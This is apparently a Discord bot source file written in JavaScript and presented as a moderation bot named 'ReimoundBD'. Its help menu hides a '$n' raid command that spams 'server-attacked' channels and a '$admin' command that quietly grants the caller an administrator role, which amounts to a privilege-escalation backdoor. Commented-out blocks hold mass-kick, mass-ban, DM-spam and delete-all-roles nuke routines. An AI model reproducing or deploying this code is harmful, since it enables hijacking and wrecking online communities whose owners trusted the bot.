const Discord = require("discord.js");
const client = new Discord.Client({ws: {Intents: Discord.Intents.ALL}})
const chalk = require('chalk');
const prefix = '$'

const subc = '875949248301129739'

/*
const fs = require('fs')
const command = require('/commands/')

const files = fs.readdirSynch(command.resolve('/commands/','commands'))


const fs = require('fs');
client.commands = new Discord.Collection()
const commandFiles = fs.readdirSync('./commands/').filter(file => 
    file.endsWith('.js'));
for (const file of commandFile){
  const command = require('/commands/')
  client.commands.set(command.name, command)
}
*/
client.on("ready", () => {




console.log(chalk.magenta(`
                                                                                                        ${client.user.tag} gestion bot!
                      `))

console.log(chalk.magenta(`


                  
                                                                                                                                                             dddddddd                                             
                              RRRRRRRRRRRRRRRRR                      iiii                                                                                    d::::::d     BBBBBBBBBBBBBBBBB  DDDDDDDDDDDDD        
                              R::::::::::::::::R                    i::::i                                                                                   d::::::d     B::::::::::::::::B D::::::::::::DDD     
                              R::::::RRRRRR:::::R                    iiii                                                                                    d::::::d     B::::::BBBBBB:::::BD:::::::::::::::DD   
                              RR:::::R     R:::::R                                                                                                           d:::::d      BB:::::B     B:::::DDD:::::DDDDD:::::D  
                                R::::R     R:::::R   eeeeeeeeeeee  iiiiiii   mmmmmmm    mmmmmmm     ooooooooooo  uuuuuu    uuuuunnnn  nnnnnnnn       ddddddddd:::::d        B::::B     B:::::B D:::::D    D:::::D 
                                R::::R     R:::::R ee::::::::::::eei:::::i mm:::::::m  m:::::::mm oo:::::::::::oou::::u    u::::n:::nn::::::::nn   dd::::::::::::::d        B::::B     B:::::B D:::::D     D:::::D
                                R::::RRRRRR:::::R e::::::eeeee:::::ei::::im::::::::::mm::::::::::o:::::::::::::::u::::u    u::::n::::::::::::::nn d::::::::::::::::d        B::::BBBBBB:::::B  D:::::D     D:::::D
                                R:::::::::::::RR e::::::e     e:::::i::::im::::::::::::::::::::::o:::::ooooo:::::u::::u    u::::nn:::::::::::::::d:::::::ddddd:::::d        B:::::::::::::BB   D:::::D     D:::::D
                                R::::RRRRRR:::::Re:::::::eeeee::::::i::::im:::::mmm::::::mmm:::::o::::o     o::::u::::u    u::::u n:::::nnnn:::::d::::::d    d:::::d        B::::BBBBBB:::::B  D:::::D     D:::::D
                                R::::R     R:::::e:::::::::::::::::ei::::im::::m   m::::m   m::::o::::o     o::::u::::u    u::::u n::::n    n::::d:::::d     d:::::d        B::::B     B:::::B D:::::D     D:::::D
                                R::::R     R:::::e::::::eeeeeeeeeee i::::im::::m   m::::m   m::::o::::o     o::::u::::u    u::::u n::::n    n::::d:::::d     d:::::d        B::::B     B:::::B D:::::D     D:::::D
                                R::::R     R:::::e:::::::e          i::::im::::m   m::::m   m::::o::::o     o::::u:::::uuuu:::::u n::::n    n::::d:::::d     d:::::d        B::::B     B:::::B D:::::D    D:::::D 
                              RR:::::R     R:::::e::::::::e        i::::::m::::m   m::::m   m::::o:::::ooooo:::::u:::::::::::::::un::::n    n::::d::::::ddddd::::::dd     BB:::::BBBBBB::::::DDD:::::DDDDD:::::D  
                              R::::::R     R:::::Re::::::::eeeeeeeei::::::m::::m   m::::m   m::::o:::::::::::::::ou:::::::::::::::n::::n    n::::nd:::::::::::::::::d     B:::::::::::::::::BD:::::::::::::::DD   
                              R::::::R     R:::::R ee:::::::::::::ei::::::m::::m   m::::m   m::::moo:::::::::::oo  uu::::::::uu:::n::::n    n::::n d:::::::::ddd::::d     B::::::::::::::::B D::::::::::::DDD     
                              RRRRRRRR     RRRRRRR   eeeeeeeeeeeeeeiiiiiiimmmmmm   mmmmmm   mmmmmm  ooooooooooo      uuuuuuuu  uuunnnnnn    nnnnnn  ddddddddd   ddddd     BBBBBBBBBBBBBBBBB  DDDDDDDDDDDDD        
`))

console.log(chalk.green(`

                                                                                                           $md      |  Dm's a user
                                                                                                           $kick    |  Kick a user
                                                                                                           $        |



`))


   presencia();  
    });



function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "$help",
  type: "PLAYING"

}
  });
}


//nuke

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === '$n'){

    console.log(chalk.green(`                                                                     [+] Raid en ejecucion`))


      message.delete()
      //message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`Reimound`, {
        type: 'text'
      }).then(channel => {
        channel.send("Reimound On TOP")
      })
    for (let i = 0; i <= 1; i++) {
         message.guild.channels.create(`server-attacked`, {
           type: 'text'
           //retarded
         }).then(channel => {
           channel.send("The server has been raided! ");
       })
       }
       //message.guild.setName("ReimoundBD IS HERE");
       //message.guild.setIcon("https://media.discordapp.net/attachments/780954296303878159/815742332132917299/asdasd.png");
     }
})

//respnse
client.on("message", async msg => {
  if(msg.content.toLowerCase().startsWith('!ping')){
    msg.channel.send('pong!')
    //client.commands.get('ping').execute(message, args)
  }
})


//kick
client.on('message', message => {
  if (!message.guild) return;

  if (message.content.toLowerCase().startsWith(prefix+'kick')) {
    const user = message.mentions.users.first();
    if (message.member.roles.cache.has(subc)){
      if (user) {
        const member = message.guild.member(user);
        if (member) {
          member
            .kick('Optional reason that will display in the audit logs')
            .then(() => {
              message.reply(`Successfully kicked ${user.tag}`);
            })
            .catch(err => {
              message.reply('I was unable to kick the member');
              console.error(err);
            });
        } else {
          message.reply("That user isn't in this guild!");
        }
      } else {
        message.reply("You didn't mention the user to kick!");
      }
    } else {
           const embed = new Discord.MessageEmbed()
          .setColor(`#ff0202`)
          .setAuthor('kick command', ' https://media.discordapp.net/attachments/780954296303878159/815742332132917299/asdasd.png')   
          .setTitle(`ERROR`)
          .setDescription(`
              $kick ${user.tag}
              `)
          .addFields(
            {name: `${message.author.tag}`, value: `You can't kick user's`, inline: true},
           )
          .setFooter(`ReimoundBD`)
     message.reply('')
     message.channel.send(embed)
     message.delete()

    }
  }
});


//disconnect
client.on('message', async message=>{
  if (!message.guild) return;

  if (message.content.toLowerCase().startsWith(prefix+"dc")){
    if (message.member.roles.cache.has(subc)){
      message.delete()
      const user = message.guild.member(user)
      if (member){
        member
        .disconnect('')
        .then(()=>{
          message.reply(`Successfully disconnected ${user.tag}`)
        })
        .catch(error=>{
          message.reply('I was unable to disconnect thhat member')
          console.log(error)
        })
      }
    } else {
      message.reply('Mention a user!')
    }
  }
})



//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('$admin')){
    let rol = await msg.guild.roles.create({data: {
      //retarded
      name: "$",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }


});

/*

//kickall
client.on("message", async message=>{
  if (message.content.startsWith('$kickall')){
    message.delete()
    if(!message.member.hasPermission("KICK_MEMBERS") || !message.membe.hasPermission("ADMINISTRATOR")) return
      message.guild.members.cache.forEach(member =>{
        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.kick().catch(e=>{console.log(`${member.user.tag} can't be kicked`)})
          console.log(`${member.user.tag} kicked succesfully`)
        }
      })
  }
})

//banall

client.on("message", async message => {
  if(message.content.startsWith('$banall')){
    message.delete();
    if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
        member.ban().catch(e => {console.log(`${member.user.tag} can't be baned`)})
        console.log(`${member.user.tag} baned succesfully`)
      }
      
    })
  }});


//mdall

/*client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === "$mdall")
                        message.delete()
                        //fuck your mom
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("The server has been raided! Reimound On TOP!").catch(error => {});
                        },450);
                      })
                      });


//borrar roles

client.on("message", message => {


                    if (message.author.bot) return;
                  
                     if(message.content === ('$delrole')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
*/

//help

client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g );
  const command = args.shift().toLowerCase();
 if (message.content.toLowerCase().startsWith(prefix+'help')) {
     message.delete().catch(error=>{})
     const embed = new Discord.MessageEmbed()
          .setColor(`#ff0202`)
          .setAuthor('Commands', ' https://media.discordapp.net/attachments/780954296303878159/815742332132917299/asdasd.png')   
          .setDescription(`
            **Prefix: $**
These are the commands:`)
          .addFields(
            //{name: '$n', value: '7´7', inline: true},
            {name: '$dm', value: 'send a dm to a user', inline:true},
            {name: 'delrole', value: 'revoke users from a rol', inline: true},
            {name: '$help', value:'shows this message'},
            {name: '\u200B', value: '\u200B'},
            //{name: `$admin`, value: '( ͡° ͜ʖ ͡°)', inline: true},
            {name: '$ban', value: "ban's a user", inline: true},
            {name: '$kick', value: "kick's a user"},
            )
          .setFooter(`ReimoundBD`)

     message.channel.send(embed)
 }
});





TOKEN=""
client.login(TOKEN);
